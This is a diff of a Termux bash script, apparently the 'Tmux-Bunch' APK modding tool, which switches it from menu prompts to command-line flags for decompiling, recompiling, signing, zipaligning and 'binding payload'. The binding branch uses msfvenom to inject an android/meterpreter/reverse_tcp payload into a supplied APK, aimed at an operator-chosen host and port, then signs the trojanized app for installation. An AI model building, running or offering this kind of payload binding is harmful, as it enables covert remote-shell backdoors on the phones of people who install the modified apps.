@@ -1,17 +1,9 @@
 #!/data/data/com.termux/files/usr/bin/bash
-clear
 unset LD_PRELOAD
 dir=$HOME/Tmux-Bunch
-if  [ $dir != $HOME/Tmux-Bunch ]
-        then
-                dir=$HOME/Tmux-Bunch
-        fi
 subs="which file ? Enter number of choice or 'x' to exit"
 esit="are you sure ? press ENTER to exit"
 return="ENTER to exit"
-#DIRECTORY="/data/data/com.termux/files/usr/share/figlet"
-TMP="Hax4Us(devil) Tmux-Bunch is a first tool for complete apk modding in TERMUX."
-VERSION="VERSION 2.3"
 #colors
 cyan='\033[1;36m'
 green='\033[1;32m'
@@ -21,9 +13,17 @@ blue='\033[1;34m'
 purple='\033[1;35m'
 reset='\033[0m'
 #################
+
+#################
+if [ "${1}" = "-h" ]
+then
+printf "$yellow  \n Tmuxbunch v2.4\n\n$blue  -d /path/to/apkname.apk For decompiling\n  -r For recompiling\n  -s For signing\n  -b For binding payload\n  -z For zipalign\n$reset"
+
+
+#################
 # Bind
 #################
-if [ "${1}" = "-b" ]
+elif [ "${1}" = "-b" ]
 then
 #cp ${2} $dir/binder
 #mv $dir/binder/$OUTPUT $HOME/metasploit-framework
@@ -39,7 +39,6 @@ echo -e "$blue [*] Please wait while binding.......🕜"
 echo
 cd $HOME/metasploit-framework
 ./msfvenom -x ${2} -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport
-
 echo -e "$green signing apk ......."
 mv $dir/unsign/output.apk $dir/unsign/$output12.apk
 sh $dir/.signapk publickey.x509.pem publickey.pk8 $dir/unsign/$output12.apk $dir/embout/$output12.apk
@@ -47,9 +46,8 @@ rm $dir/unsign/$output12.apk
 echo
 echo -e "$cyan We will met again :D , have a payload day..! 📢"
 echo
-echo -e "$blue press ENTER for main menu$reset"
-read continued
-cd $dir
+echo -e "Check embout folder for binded payload $reset"
+
 ###############
 #decompile
 ###############
@@ -84,10 +82,8 @@ echo -e "$blue ____________________________________"
 echo
 echo -e "$yellow Decompiled files in 'recompiler' folder. You can now play with apk source code"
 echo
-echo -e "$green $return $reset"
-read s
+echo -e "$reset"
 fi
-cd $dir
 ###############
 # recompile
 ##############
@@ -122,10 +118,8 @@ echo -e "$green ________________________________________"
 echo
 echo -e "$blue recompiled apk in 'unsign' folder. Sign apk before installing"
 echo
-echo -e "$red $return $reset"
-read a
+echo -e "$reset"
 fi
-cd $dir
 ###########################
 # sign
 #####################
@@ -161,10 +155,8 @@ echo -e "$blue _______________________________________"
 echo
 echo -e "$green signed apk in 'sign' folder"
 echo
-echo -e "$red $return $reset"
-read lokesh
+echo -e "$reset"
 fi
-cd $dir
 #################
 # Zipalign
 #################
@@ -197,15 +189,10 @@ echo -e "$blue________________________________________"
 echo
 echo -e "$yellow zipaligned apk in 'zipalign' folder"
 echo
-echo -e "$green $return $reset"
-read devil
+echo -e "$reset"
 fi
-cd $dir
-##################
-fi
+#################
 else
-echo "Wrong choice. Redirecting to main menu"
-sleep 4
-tmuxbunch
+printf "$red invalid option ${1}\n$green try 'tbunch -h' for more information\n $reset"
 fi
-########i
+
